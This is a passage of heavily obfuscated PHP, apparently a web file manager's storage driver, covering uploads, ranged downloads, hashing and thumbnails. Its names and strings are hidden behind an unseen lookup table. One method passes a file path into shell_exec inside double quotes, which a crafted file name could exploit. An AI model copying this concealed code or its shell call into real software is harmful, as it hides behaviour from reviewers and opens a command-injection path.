str_replace(trim(get_url_root($÷ÃÌÍüı), $İ…µÔÜ[8]), trim($this->cdnHost, $İ…µÔÜ[8]), $÷ÃÌÍüı); } public function uploadLink($º¼¾®¹à, $’˜¶µ’Ğ = 0) { $Ñ”çÙòŸ =& $_SERVER[Ï×Œõ”û]; if ($this->isUploadServer()) { return; } $ë±ıÕáû = $this->getType(); if (!in_array($ë±ıÕáû, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $†€Ñ¨Óæ = 1024 * 1024 * 10; $¦úĞ¤² = (!$’˜¶µ’Ğ ? 1 : ceil($’˜¶µ’Ğ / pow(1024, 3))) * 3600 * 4; if ($’˜¶µ’Ğ <= $†€Ñ¨Óæ) { $µ´ÉÚ® = $this->uploadFormData($º¼¾®¹à, $¦úĞ¤²); } else { $µ´ÉÚ® = $this->uploadMultiData($º¼¾®¹à, $¦úĞ¤²); } if ($µ´ÉÚ®) { $µ´ÉÚ®[$Ñ”çÙòŸ[95]] = $º¼¾®¹à; $µ´ÉÚ®[$Ñ”çÙòŸ[96]] = $ë±ıÕáû; } return $µ´ÉÚ®; } public function uploadFormData($È°ÏüÚó, $œ¢¶³­Æ = 3600) { } public function uploadMultiData($Õ”¬£É°, $×ó† = 3600) { } public function multiUploadFormData($¹Šèìã½, $èÔ¿çÑë = 3600) { return $this->uploadMultiData($¹Šèìã½, $èÔ¿çÑë); } public function download($£½£€˜÷, $«ÓĞ¼ç) { } public function ext($àÙ£Ñò’) { $™ìÚî…† =& $_SERVER[Ï×Œõ”û]; if (strpos($àÙ£Ñò’, $™ìÚî…†[8]) === -1) { $”‚¿Åü‡ = $àÙ£Ñò’; } else { $”‚¿Åü‡ = $this->pathThis($àÙ£Ñò’); } $šˆÈ­¨ = $™ìÚî…†[12]; if (strstr($”‚¿Åü‡, $™ìÚî…†[10])) { $šˆÈ­¨ = substr($”‚¿Åü‡, strrpos($”‚¿Åü‡, $™ìÚî…†[10]) + 1); $šˆÈ­¨ = strtolower($šˆÈ­¨); } if (strlen($šˆÈ­¨) > 3 && preg_match($™ìÚî…†[97], $šˆÈ­¨, $ìŞ¤¤ÉÁ)) { $šˆÈ­¨ = $™ìÚî…†[12]; } return $šˆÈ­¨; } public function pathThis($ôš¹Çº) { $‹¨şò‡ó =& $_SERVER[Ï×Œõ”û]; $ôš¹Çº = str_replace($‹¨şò‡ó[98], $‹¨şò‡ó[8], rtrim($ôš¹Çº, $‹¨şò‡ó[8])); $ì®ÒúÒò = strrpos($ôš¹Çº, $‹¨şò‡ó[8]); if ($ì®ÒúÒò === !1) { return $ôš¹Çº; } return substr($ôš¹Çº, $ì®ÒúÒò + 1); } public function pathFather($ığˆ „¥) { $‹‰Î‹çû =& $_SERVER[Ï×Œõ”û]; $ığˆ „¥ = str_replace($‹‰Î‹çû[98], $‹‰Î‹çû[8], rtrim($ığˆ „¥, $‹‰Î‹çû[8])); $Ÿ¾Ö¾îĞ = strrpos($ığˆ „¥, $‹‰Î‹çû[8]); if ($Ÿ¾Ö¾îĞ === !1) { return $‹‰Î‹çû[12]; } return substr($ığˆ „¥, 0, $Ÿ¾Ö¾îĞ + 1); } public function hashSimple($ûÁ»¬»®) { $ÎÌ¦ø‚Ã =& $_SERVER[Ï×Œõ”û]; if (!$ûÁ»¬»®) { return md5($ÎÌ¦ø‚Ã[12]); } $¥ùÇ¨«ˆ = $this->size($ûÁ»¬»®); $™çŠªÖ = 200; $³õ™«Ù‹ = 50; if ($¥ùÇ¨«ˆ <= $™çŠªÖ * $³õ™«Ù‹) { return $this->hashMd5($ûÁ»¬»®) . $¥ùÇ¨«ˆ; } $ì§±—¥Ã = intval($¥ùÇ¨«ˆ / $³õ™«Ù‹); $¿¾½Ş©Ì = $ÎÌ¦ø‚Ã[12]; for ($Üªµõ‡‘ = 0; $Üªµõ‡‘ < $³õ™«Ù‹; $Üªµõ‡‘++) { $¿¾½Ş©Ì .= $this->fileSubstr($ûÁ»¬»®, $ì§±—¥Ã * $Üªµõ‡‘, $™çŠªÖ); } $¿¾½Ş©Ì .= $this->fileSubstr($ûÁ»¬»®, $¥ùÇ¨«ˆ - $™çŠªÖ, $™çŠªÖ); return md5($¿¾½Ş©Ì) . $¥ùÇ¨«ˆ; } public static $md5Cache = array(); public function hashMd5($Ù³õ¤öÍ) { if (!$Ù³õ¤öÍ) { return md5($_SERVER[Ï×Œõ”û][12]); } $Ù³õ¤öÍ = $this->iconvSystem($Ù³õ¤öÍ); if (isset(self::$md5Cache[$Ù³õ¤öÍ])) { return self::$md5Cache[$Ù³õ¤öÍ]; } self::$md5Cache[$Ù³õ¤öÍ] = $this->hashMd5Shell($Ù³õ¤öÍ); if (!self::$md5Cache[$Ù³õ¤öÍ]) { self::$md5Cache[$Ù³õ¤öÍ] = @md5_file($Ù³õ¤öÍ); } return self::$md5Cache[$Ù³õ¤öÍ]; } private function hashMd5Shell($°£›‚Õ“) { $ í­şö© =& $_SERVER[Ï×Œõ”û]; if (!$°£›‚Õ“) { return md5($ í­şö©[12]); } if (!function_exists($ í­şö©[99])) { return !1; } $äÏ¾²÷Î = array($ í­şö©[100], $ í­şö©[101]); $®Ù„Ï¡Å = Cache::get($ í­şö©[102]); if (!$®Ù„Ï¡Å) { $å†ŒÄ¤Î = BASIC_PATH . $ í­şö©[103]; $èª‘Íó = md5_file($å†ŒÄ¤Î); $®Ù„Ï¡Å = $ í­şö©[104]; foreach ($äÏ¾²÷Î as $Şò×ïâ) { $”„üëä– = shell_exec($Şò×ïâ . "\x20\x22{$å†ŒÄ¤Î}\x22"); if ($”„üëä– && substr(trim($”„üëä–), 0, 32) == $èª‘Íó) { $®Ù„Ï¡Å = $Şò×ïâ; break; } } Cache::set($ í­şö©[102], $®Ù„Ï¡Å, 3600); } if ($®Ù„Ï¡Å == $ í­şö©[104]) { return !1; } $”„üëä– = shell_exec($®Ù„Ï¡Å . "\40\x22{$°£›‚Õ“}\x22"); $”„üëä– = str_replace($ í­şö©[105], $ í­şö©[12], $”„üëä–); return substr($”„üëä–, 0, 32); } public function link($Û—Üœ“ê) { return $Û—Üœ“ê; } public function fileOut($ß–‡¾Â›, $÷Æ½›ËÆ = false, $”ÄòÂ… = false, $‹ÛŸµÄô = '') { $çÛ¬¤Ç© =& $_SERVER[Ï×Œõ”û]; $this->cacheMethod(null, null); if (!$ß–‡¾Â› || !$this->exist($ß–‡¾Â›)) { show_json(LNG($çÛ¬¤Ç©[106]), !1, $”ÄòÂ…); } $æİö‰‰Æ = $this->getType() == $çÛ¬¤Ç©[107]; $µ®Ó´¿™ = $GLOBALS[$çÛ¬¤Ç©[6]][$çÛ¬¤Ç©[92]][$çÛ¬¤Ç©[108]][$çÛ¬¤Ç©[109]]; $‘ÑÉïå = (double) $GLOBALS[$çÛ¬¤Ç©[6]][$çÛ¬¤Ç©[92]][$çÛ¬¤Ç©[108]][$çÛ¬¤Ç©[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÛùÊé³¤ = $this->infoFull($ß–‡¾Â›); $ÜèÉº¤Ê = $ÛùÊé³¤[$çÛ¬¤Ç©[79]]; $…“ê›öä = gmdate($çÛ¬¤Ç©[111], $ÛùÊé³¤[$çÛ¬¤Ç©[88]]); $—«²Ò‚Ì = $”ÄòÂ… ? $”ÄòÂ… : $this->iconvApp($ÛùÊé³¤[$çÛ¬¤Ç©[32]]); $ªŠãğµ³ = 0; $ÈÂççÅü = $ÜèÉº¤Ê - 1; $³ã¬·®£ = $this->ext($—«²Ò‚Ì); if (in_array($³ã¬·®£, array($çÛ¬¤Ç©[112], $çÛ¬¤Ç©[113], $çÛ¬¤Ç©[114], $çÛ¬¤Ç©[115]))) { $³ã¬·®£ = $çÛ¬¤Ç©[116]; } if (in_array($³ã¬·®£, array($çÛ¬¤Ç©[117]))) { $³ã¬·®£ = $çÛ¬¤Ç©[118]; } if (!$‹ÛŸµÄô) { $‹ÛŸµÄô = md5($…“ê›öä . $ÜèÉº¤Ê); } $‹ÛŸµÄô = $çÛ¬¤Ç©[119] . $‹ÛŸµÄô . $çÛ¬¤Ç©[119]; $²Ÿ…À = get_file_mime($³ã¬·®£); $€‰øš‹À = !0; $€‰øš‹À = isset($_GET[$çÛ¬¤Ç©[120]]) ? !1 : !0; if ($÷Æ½›ËÆ === !1 && !mime_support($²Ÿ…À)) { $²Ÿ…À = $çÛ¬¤Ç©[121]; } header($çÛ¬¤Ç©[122]); header($çÛ¬¤Ç©[123] . $²Ÿ…À); $ûÉÉŒ¤Ù = rawurlencode($—«²Ò‚Ì); $ûÉÉŒ¤Ù = $çÛ¬¤Ç©[119] . $ûÉÉŒ¤Ù . $çÛ¬¤Ç©[124] . $ûÉÉŒ¤Ù; if ($÷Æ½›ËÆ) { header($çÛ¬¤Ç©[125]); header($çÛ¬¤Ç©[126]); header($çÛ¬¤Ç©[127] . $ûÉÉŒ¤Ù); } else { if ($€‰øš‹À) { header($çÛ¬¤Ç©[128] . $ûÉÉŒ¤Ù); } } $íØëÅë† = 3600 * 24 * 30; header($çÛ¬¤Ç©[129]); header($çÛ¬¤Ç©[130]); header($çÛ¬¤Ç©[131] . $íØëÅë†); header($çÛ¬¤Ç©[132] . gmdate($çÛ¬¤Ç©[111], time() + $íØëÅë†) . $çÛ¬¤Ç©[133]); if (isset($_SERVER[$çÛ¬¤Ç©[134]]) && strtotime($_SERVER[$çÛ¬¤Ç©[134]]) == $ÛùÊé³¤[$çÛ¬¤Ç©[88]]) { header($çÛ¬¤Ç©[135], !0, 304); die; } if (isset($_SERVER[$çÛ¬¤Ç©[136]]) && $_SERVER[$çÛ¬¤Ç©[136]] == $‹ÛŸµÄô) { header($çÛ¬¤Ç©[137] . $‹ÛŸµÄô, !0, 304); die; } header($çÛ¬¤Ç©[137] . $‹ÛŸµÄô); header($çÛ¬¤Ç©[138] . $…“ê›öä . $çÛ¬¤Ç©[133]); header($çÛ¬¤Ç©[139] . rawurlencode($—«²Ò‚Ì)); header($çÛ¬¤Ç©[140]); header($çÛ¬¤Ç©[141] . $ÜèÉº¤Ê); header($çÛ¬¤Ç©[142]); Hook::trigger($çÛ¬¤Ç©[143], $ß–‡¾Â›, $ÜèÉº¤Ê, $—«²Ò‚Ì, $³ã¬·®£); if (!$÷Æ½›ËÆ && $³ã¬·®£ == $çÛ¬¤Ç©[144]) { if ($ÜèÉº¤Ê > 1024 * 1024 * 10) { die; } $î·¨´â¦ = $this->getContent($ß–‡¾Â›); $î·¨´â¦ = Html::clearSVG($î·¨´â¦); header($çÛ¬¤Ç©[145] . strlen($î·¨´â¦)); echo $î·¨´â¦; die; } $Âáşº¿ = strtolower($_SERVER[$çÛ¬¤Ç©[146]]); if ($æİö‰‰Æ && $Âáşº¿ && $µ®Ó´¿™) { if (strstr($Âáşº¿, $çÛ¬¤Ç©[147])) { header($çÛ¬¤Ç©[148] . $ß–‡¾Â›); } else { if (strstr($Âáşº¿, $çÛ¬¤Ç©[149])) { header($çÛ¬¤Ç©[150] . $ß–‡¾Â›); } else { if (strstr($Âáşº¿, $çÛ¬¤Ç©[151])) { header($çÛ¬¤Ç©[152] . $ß–‡¾Â›); } } } if ($‘ÑÉïå) { header($çÛ¬¤Ç©[153] . $‘ÑÉïå); } return; } if (isset($_SERVER[$çÛ¬¤Ç©[154]])) { if (preg_match($çÛ¬¤Ç©[155], $_SERVER[$çÛ¬¤Ç©[154]], $ÀÉù’İ¬)) { $ªŠãğµ³ = intval($ÀÉù’İ¬[1]); $ªŠãğµ³ = $ªŠãğµ³ <= 0 ? 0 : ($ªŠãğµ³ >= $ÈÂççÅü ? $ÈÂççÅü : $ªŠãğµ³); if (!empty($ÀÉù’İ¬[2])) { $à¡¦Å ä = intval($ÀÉù’İ¬[2]); $ÈÂççÅü = $à¡¦Å ä < $ªŠãğµ³ ? $ªŠãğµ³ : ($à¡¦Å ä >= $ÈÂççÅü ? $ÈÂççÅü : $à¡¦Å ä); } } header($çÛ¬¤Ç©[156]); header("\103\157\x6e\x74\145\156\x74\55\122\x61\156\147\x65\x3a\40\142\171\164\145\x73\40{$ªŠãğµ³}\x2d{$ÈÂççÅü}\57" . $ÜèÉº¤Ê); } else { header($çÛ¬¤Ç©[157]); } header($çÛ¬¤Ç©[158]); header($çÛ¬¤Ç©[159]); $Úïš¬½­ = !0; if ($_SERVER[$çÛ¬¤Ç©[160]] == $çÛ¬¤Ç©[161] && $ÜèÉº¤Ê > 1204 * 1024 * 1024 * 2) { $Úïš¬½­ = !1; } if ($Úïš¬½­) { header($çÛ¬¤Ç©[162] . ($ÈÂççÅü - $ªŠãğµ³ + 1)); } if ($_SERVER[$çÛ¬¤Ç©[163]] == $çÛ¬¤Ç©[164]) { return; } $šØ¶¨ü× = array($çÛ¬¤Ç©[165] => !1, $çÛ¬¤Ç©[166] => $ªŠãğµ³, $çÛ¬¤Ç©[167] => $ÈÂççÅü, $çÛ¬¤Ç©[168] => $³ã¬·®£, $çÛ¬¤Ç©[169] => $ÛùÊé³¤, $çÛ¬¤Ç©[170] => $çÛ¬¤Ç©[12], $çÛ¬¤Ç©[171] => 0); $šØ¶¨ü× = Hook::filter($çÛ¬¤Ç©[172], $šØ¶¨ü×); $¹„êèİ = 1024 * 300; $ÖÏÆá†§ = 0; if ($‘ÑÉïå) { $ÖÏÆá†§ = intval(1000 * 1000 * ($¹„êèİ / $‘ÑÉïå)); } while ($ªŠãğµ³ <= $ÈÂççÅü) { $¼¿õÖØø = timeFloat(); check_abort(); $ ÕäŸı… = $ÈÂççÅü - $ªŠãğµ³ + 1; if ($ ÕäŸı… <= $¹„êèİ) { $¹„êèİ = $ ÕäŸı…; } $î·¨´â¦ = $this->fileSubstr($ß–‡¾Â›, $ªŠãğµ³, $¹„êèİ); if ($šØ¶¨ü×[$çÛ¬¤Ç©[165]]) { $šØ¶¨ü×[$çÛ¬¤Ç©[170]] = $î·¨´â¦; $šØ¶¨ü×[$çÛ¬¤Ç©[171]] = $ªŠãğµ³; $šØ¶¨ü× = Hook::filter($çÛ¬¤Ç©[173], $šØ¶¨ü×); $î·¨´â¦ = $šØ¶¨ü×[$çÛ¬¤Ç©[170]]; } echo $î·¨´â¦; $ªŠãğµ³ += $¹„êèİ; if ($¹„êèİ == $ ÕäŸı…) { $ªŠãğµ³ = $ÈÂççÅü + 1; } if ($ÖÏÆá†§) { $Øå–òÂØ = intval(1000 * 1000 * (timeFloat() - $¼¿õÖØø)); $ÍĞş¦› = $ÖÏÆá†§ - $Øå–òÂØ; if ($ÍĞş¦› > 5) { usleep($ÍĞş¦›); } } } } public function fileOutServer($‡Ş¯µèô, $‹µçÖÒà = false, $¨£íğè = false, $¨Ş‚–â» = '') { $this->fileOut($‡Ş¯µèô, $‹µçÖÒà, $¨£íğè, $¨Ş‚–â»); } public function fileOutLink($Û÷óÛÂÊ) { header($_SERVER[Ï×Œõ”û][174] . $Û÷óÛÂÊ); die; } public function cacheMethod($É¿Ğòù§, $”ğÇ€«, $ÃÚ¦¿ºÀ = null) { $¿‰°ü‘æ =& $_SERVER[Ï×Œõ”û]; static $ø¢üìõ  = array(); $¾ºƒ‰âÙ = $”ğÇ€« ? ltrim($this->getPathOuter($”ğÇ€«), $¿‰°ü‘æ[8]) : $¿‰°ü‘æ[12]; $ªş“¤§ = $¿‰°ü‘æ[175] . $É¿Ğòù§ . $¿‰°ü‘æ[176] . rtrim($¾ºƒ‰âÙ, $¿‰°ü‘æ[8]); if (is_null($É¿Ğòù§)) { $ø¢üìõ  = array(); return; } if (is_null($”ğÇ€«)) { foreach ($ø¢üìõ  as $ªş“¤§ => $õğ³Æ‡Ü) { if (!strstr($ªş“¤§, $¿‰°ü‘æ[175] . $É¿Ğòù§ . $¿‰°ü‘æ[177])) { continue; } unset($ø¢üìõ [$ªş“¤§]); } return; } if ($ÃÚ¦¿ºÀ === $¿‰°ü‘æ[178]) { unset($ø¢üìõ [$ªş“¤§]); return; } if (!is_null($ÃÚ¦¿ºÀ)) { $ø¢üìõ [$ªş“¤§] = $ÃÚ¦¿ºÀ; return; } $äıÎ²¡ = isset($ø¢üìõ [$ªş“¤§]) ? $ø¢üìõ [$ªş“¤§] : null; if (!is_null($äıÎ²¡)) { return $äıÎ²¡; } $äıÎ²¡ = $this->{$É¿Ğòù§}($”ğÇ€«); $ø¢üìõ [$ªş“¤§] = $äıÎ²¡; return $äıÎ²¡; } public function cacheMethodInfoSet($‰’ûíŒ›, $£ÇÀœ£û, $ê‚…®µû = false) { $¼¥¤Úæ =& $_SERVER[Ï×Œõ”û]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¼¥¤Úæ[179], $‰’ûíŒ›, $£ÇÀœ£û); $this->cacheMethod($¼¥¤Úæ[180], $‰’ûíŒ›, $£ÇÀœ£û ? !1 : !0); if (is_array($ê‚…®µû)) { $this->cacheMethod($¼¥¤Úæ[181], $‰’ûíŒ›, $ê‚…®µû); } } public function fileOutImage($Ö¾ù÷ÓÇ, $ãĞ«¯ = 250) { $®¼øÂ²Ø =& $_SERVER[Ï×Œõ”û]; set_timeout(); if (substr($Ö¾ù÷ÓÇ, 0, 4) == $®¼øÂ²Ø[151]) { $this->fileOutLink($Ö¾ù÷ÓÇ); } $ÜûàØ˜‹ = $this->info($Ö¾ù÷ÓÇ); $Óñàğé = !1; $öÊƒ¬ìæ = isset($GLOBALS[$®¼øÂ²Ø[182]]) ? $GLOBALS[$®¼øÂ²Ø[182]] : array(); if ($öÊƒ¬ìæ && $öÊƒ¬ìæ[$®¼øÂ²Ø[183]] == $ÜûàØ˜‹[$®¼øÂ²Ø[87]]) { $ÜûàØ˜‹ = $öÊƒ¬ìæ; $Õ¦Ì­—÷ = $ÜûàØ˜‹[$®¼øÂ²Ø[184]]; if ($Õ¦Ì­—÷ && isset($Õ¦Ì­—÷[$®¼øÂ²Ø[185]])) { if ($Õ¦Ì­—÷[$®¼øÂ²Ø[185]] <= $ãĞ«¯ && $Õ¦Ì­—÷[$®¼øÂ²Ø[186]] <= $ãĞ«¯) { $Óñàğé = !0; } } } if ($ÜûàØ˜‹[$®¼øÂ²Ø[79]] <= 1024 * 50 || $Óñàğé || !function_exists($®¼øÂ²Ø[187]) || $ÜûàØ˜‹[$®¼øÂ²Ø[168]] == $®¼øÂ²Ø[188]) { return $this->fileOut($Ö¾ù÷ÓÇ, !1, $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); } $ğÂ´à‘Í = kodIO::hashPath($ÜûàØ˜‹); $ªú£ôĞƒ = "\x63\157\x76\145\x72\x5f{$ğÂ´à‘Í}\x5f{$ãĞ«¯}\x2e\160\x6e\147"; $¯‡Á®Õ— = IO_PATH_SYSTEM_TEMP . $®¼øÂ²Ø[189]; $ŠöÉÍ˜â = IO::infoFullSimple($¯‡Á®Õ—); $ğ‰°­Š‘ = $ŠöÉÍ˜â && is_array($ŠöÉÍ˜â) ? $ŠöÉÍ˜â[$®¼øÂ²Ø[87]] : $®¼øÂ²Ø[12]; if (!$ğ‰°­Š‘) { $ğ‰°­Š‘ = IO::mkdir($¯‡Á®Õ—); } if ($ÜûàØ˜‹[$®¼øÂ²Ø[190]] == $®¼øÂ²Ø[191] && isset($ÜûàØ˜‹[$®¼øÂ²Ø[192]]) && $ÜûàØ˜‹[$®¼øÂ²Ø[192]] == kodIO::sourceID($ğ‰°­Š‘)) { $Àôª€»ç = $ÜûàØ˜‹[$®¼øÂ²Ø[193]]; if ($ãĞ«¯ <= 500) { $ø©ûº¯ = preg_replace($®¼øÂ²Ø[194], $®¼øÂ²Ø[195], $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); $Àôª€»ç = IO::fileNameExist($ğ‰°­Š‘, $ø©ûº¯); } return IO::fileOut(KodIO::make($Àôª€»ç), !1, $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); } $˜¶‡ò€É = IO::fileNameExist($ğ‰°­Š‘, $ªú£ôĞƒ); if ($˜¶‡ò€É) { return IO::fileOut(KodIO::make($˜¶‡ò€É), !1, $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); } if ($ãĞ«¯ > 1000) { $this->makeImageCover($ğ‰°­Š‘, $Ö¾ù÷ÓÇ, $ªú£ôĞƒ, $ãĞ«¯); $this->makeImageCover($ğ‰°­Š‘, $Ö¾ù÷ÓÇ, "\143\x6f\x76\x65\162\x5f{$ğÂ´à‘Í}\x5f\x32\65\60\x2e\x70\x6e\x67", 250); $˜¶‡ò€É = IO::fileNameExist($ğ‰°­Š‘, $ªú£ôĞƒ); if ($˜¶‡ò€É) { return IO::fileOut(KodIO::make($˜¶‡ò€É), !1, $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); } die; } if (!kodIO::allowCover($ÜûàØ˜‹)) { return $this->fileOut($Ö¾ù÷ÓÇ, !1, $ÜûàØ˜‹[$®¼øÂ²Ø[32]]); } $ŞíÖâÉ‡ = Cache::get($ªú£ôĞƒ); if ($ŞíÖâÉ‡ == $®¼øÂ²Ø[196] || $ŞíÖâÉ‡ == $®¼øÂ²Ø[197]) { echo $ŞíÖâÉ‡; die; } Cache::set($ªú£ôĞƒ, $®¼øÂ²Ø[197], 60); $¯à¡¦“Ú = array($ğ‰°­Š‘, $ÜûàØ˜‹[$®¼øÂ²Ø[87]], $ªú£ôĞƒ, $ãĞ«¯); $ Êó¤ = $®¼øÂ²Ø[198] . $ÜûàØ˜‹[$®¼øÂ²Ø[79]] . $®¼øÂ²Ø[199] . $ªú£ôĞƒ . $®¼øÂ²Ø[200] . $ÜûàØ˜‹[$®¼øÂ²Ø[32]] . $®¼øÂ²Ø[201] . $ÜûàØ˜‹[$®¼øÂ²Ø[87]]; TaskQueue::add($®¼øÂ²Ø[202], $¯à¡¦“Ú, $ Êó¤, $ªú£ôĞƒ); } public function makeImageCover($ÈŞ¹ÌÖÖ, $÷àâıì, $•ËÊ¸ûš, $¥Ó˜ÙÅ˜) { $ì÷ïÒ¬ =& $_SERVER[Ï×Œõ”û]; if (IO::fileNameExist($ÈŞ¹ÌÖÖ, $•ËÊ¸ûš)) { return $ì÷ïÒ¬[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¼é—–”© = $this->getPathOuter($÷àâıì); $ñİĞ÷‚Û = DATA_THUMB . $•ËÊ¸ûš; del_file($ñİĞ÷‚Û); $…™øºšñ = IO::copy($¼é—–”©, TEMP_FILES, !1, $•ËÊ¸ûš); if (!@file_exists($…™øºšñ)) { return $ì÷ïÒ¬[204]; } ImageThumb::createThumb($…™øºšñ, $ñİĞ÷‚Û, $¥Ó˜ÙÅ˜, $¥Ó˜ÙÅ˜ * 10); if (@file_exists($ñİĞ÷‚Û)) { Cache::remove($•ËÊ¸ûš); return IO::move($ñİĞ÷‚Û, $ÈŞ¹ÌÖÖ); } Cache::set($•ËÊ¸ûš, $ì÷ïÒ¬[196], 600); del_file($ñİĞ÷‚Û); return $ì÷ïÒ¬[205] . $…™øºšñ . $ì÷ïÒ¬[74]; } public function fileOutImageServer($äÖç€Ú, $”²ùæê = 250) { $this->fileOutImage($äÖç€Ú, $”²ùæê); } public function fileNameAuto($ö‰š–ÅÎ, $ôœÙ †š, $¿çºâ‹ = REPEAT_RENAME, $Ü²Ú§‹ = false) { $ŒÆöõ×Ã =& $_SERVER[Ï×Œõ”û]; $£” –Ã = $ö‰š–ÅÎ === $ŒÆöõ×Ã[12] ? $ôœÙ †š : rtrim($ö‰š–ÅÎ, $ŒÆöõ×Ã[8]) . $ŒÆöõ×Ã[8] . $ôœÙ †š; if ($¿çºâ‹ == REPEAT_REPLACE || !$this->exist($£” –Ã) || $Ü²Ú§‹ && $¿çºâ‹ != REPEAT_RENAME_FOLDER) { return $ôœÙ †š; } if ($¿çºâ‹ == REPEAT_SKIP) { return !1; } $Ö¨±ğÈ© = $ŒÆöõ×Ã[10] . get_path_ext($ôœÙ †š); $Ö¨±ğÈ© = $Ö¨±ğÈ© == $ŒÆöõ×Ã[10] || $Ü²Ú§‹ ? $ŒÆöõ×Ã[12] : $Ö¨±ğÈ©; $£ˆ°ÜŠ = 1; $ìöª¼±Ú = substr($ôœÙ †š, 0, strlen($ôœÙ †š) - strlen($Ö¨±ğÈ©)); $¡ï·’Ù· = $ìöª¼±Ú . "\x28{$£ˆ°ÜŠ}\x29{$Ö¨±ğÈ©}"; while ($this->exist(rtrim($ö‰š–ÅÎ, $ŒÆöõ×Ã[8]) . $ŒÆöõ×Ã[8] . $¡ï·’Ù·)) { $¡ï·’Ù· = $ìöª¼±Ú . "\50{$£ˆ°ÜŠ}\x29{$Ö¨±ğÈ©}"; $£ˆ°ÜŠ++; } return $¡ï·’Ù·; } private function fileNameAutoList($çúï¿½¤, $ùìµõª¬, $Úğ’êã¥ = false) { $ü¬†™ÔÇ =& $_SERVER[Ï×Œõ”û]; $’â³¼éá = $this->listPath($çúï¿½¤, !0); $’â³¼éá = array_merge($’â³¼éá[$ü¬†™ÔÇ[85]], $’â³¼éá[$ü¬†™ÔÇ[86]]); $øğ© Š = array_to_keyvalue($’â³¼éá, $ü¬†™ÔÇ[12], $ü¬†™ÔÇ[32]); $âÆÅ‡¶Ñ = $ü¬†™ÔÇ[10] . get_path_ext($ùìµõª¬); $âÆÅ‡¶Ñ = $âÆÅ‡¶Ñ == $ü¬†™ÔÇ[10] || $Úğ’êã¥ ? $ü¬†™ÔÇ[12] : $âÆÅ‡¶Ñ; $›óé½°… = substr($ùìµõª¬, 0, strlen($ùìµõª¬) - strlen($âÆÅ‡¶Ñ)); $üä»Ã¡© = $›óé½°… . "\x28\60\51{$âÆÅ‡¶Ñ}"; for ($­«Ü¾šˆ = 1; $­«Ü¾šˆ <= count($øğ© Š) + 1; $­«Ü¾šˆ++) { $üä»Ã¡© = $›óé½°… . "\x28{$­«Ü¾šˆ}\51{$âÆÅ‡¶Ñ}"; if (!in_array_not_case($üä»Ã¡©, $øğ© Š)) { return $üä»Ã¡©; } } return $üä»Ã¡©; } public function listAllFiles($ê«‡Å”¹, $ÃÒÅµÔâ) { $çÚÉ ğ =& $_SERVER[Ï×Œõ”û]; if (empty($ÃÒÅµÔâ)) { return array(); } $‡Ê‹µû = array_keys($ÃÒÅµÔâ); $Š‘Šêû£ = array(); $ê«‡Å”¹ = trim($ê«‡Å”¹, $çÚÉ ğ[8]); foreach ($ÃÒÅµÔâ as $Ã´µóä => $…åÓ ÇÊ) { $‰©³¯í× = ltrim(substr(trim($Ã´µóä, $çÚÉ ğ[8]), strlen($ê«‡Å”¹)), $çÚÉ ğ[8]); if (substr($Ã´µóä, -1) == $çÚÉ ğ[8]) { $‰©³¯í× = rtrim($‰©³¯í×, $çÚÉ ğ[8]) . $çÚÉ ğ[8]; } $Š‘Šêû£ = array_merge($Š‘Šêû£, $this->slicePath($‰©³¯í×)); } $°Ñìó½É = array(); foreach (array_unique($Š‘Šêû£) as $„íÈ¹ ) { $æêº«éĞ = array($çÚÉ ğ[87] => $this->getPathOuter($çÚÉ ğ[8] . $ê«‡Å”¹ . $çÚÉ ğ[8] . $„íÈ¹ ), $çÚÉ ğ[78] => 1, $çÚÉ ğ[79] => 0); if (substr($„íÈ¹ , -1) != $çÚÉ ğ[8]) { $æêº«éĞ[$çÚÉ ğ[78]] = 0; $™²×ƒ›¯ = $this->getPath($ê«‡Å”¹ . $çÚÉ ğ[8] . $„íÈ¹ ); if (isset($ÃÒÅµÔâ[$™²×ƒ›¯])) { $“ŸÚÚÕç = $ÃÒÅµÔâ[$™²×ƒ›¯]; if (isset($“ŸÚÚÕç[$çÚÉ ğ[79]])) { $æêº«éĞ[$çÚÉ ğ[79]] = intval($“ŸÚÚÕç[$çÚÉ ğ[79]]); } if (isset($“ŸÚÚÕç[$çÚÉ ğ[206]])) { $æêº«éĞ[$çÚÉ ğ[88]] = intval($“ŸÚÚÕç[$çÚÉ ğ[206]]); } } } $°Ñìó½É[] = $æêº«éĞ; } return $°Ñìó½É; } public function slicePath($¶ƒÈ˜Ÿ¾) { $±¶Ú¸‘ñ =& $_SERVER[Ï×Œõ”û]; $Ì¤ˆÏîÛ = explode($±¶Ú¸‘ñ[8], trim($¶ƒÈ˜Ÿ¾, $±¶Ú¸‘ñ[8])); $ªíñ–„­ = 0; do { ++$ªíñ–„­; $ò»Ó©‡ú[] = implode($±¶Ú¸‘ñ[8], array_slice($Ì¤ˆÏîÛ, 0, $ªíñ–„­)) . $±¶Ú¸‘ñ[8]; } while ($ªíñ–„­ < count($Ì¤ˆÏîÛ)); $ò»Ó©‡ú[count($Ì¤ˆÏîÛ) - 1] = $¶ƒÈ˜Ÿ¾; return $ò»Ó©‡ú; } public function getHost() { $ÑŠ‹ùğµ =& $_SERVER[Ï×Œõ”û]; $ “ÌâÑ‰ = parse_url(trim($this->domain, $ÑŠ‹ùğµ[8])); $ì¸¡†ìƒ = isset($ “ÌâÑ‰[$ÑŠ‹ùğµ[207]]) ? $ “ÌâÑ‰[$ÑŠ‹ùğµ[207]] : http_type(); $¾ÚÚ‹µÔ = isset($ “ÌâÑ‰[$ÑŠ‹ùğµ[208]]) ? $ “ÌâÑ‰[$ÑŠ‹ùğµ[208]] : $ “ÌâÑ‰[$ÑŠ‹ùğµ[87]]; if (isset($ “ÌâÑ‰[$ÑŠ‹ùğµ[209]])) { $¾ÚÚ‹µÔ .= $ÑŠ‹ùğµ[4] . $ “ÌâÑ‰[$ÑŠ‹ùğµ[209]]; } return $ì¸¡†ìƒ . $ÑŠ‹ùğµ[210] . $¾ÚÚ‹µÔ; } public function pathEncode($‚¸ÉëÙù) { $éÍ¯§Òô =& $_SERVER[Ï×Œõ”û]; return str_replace($éÍ¯§Òô[211], $éÍ¯§Òô[8], 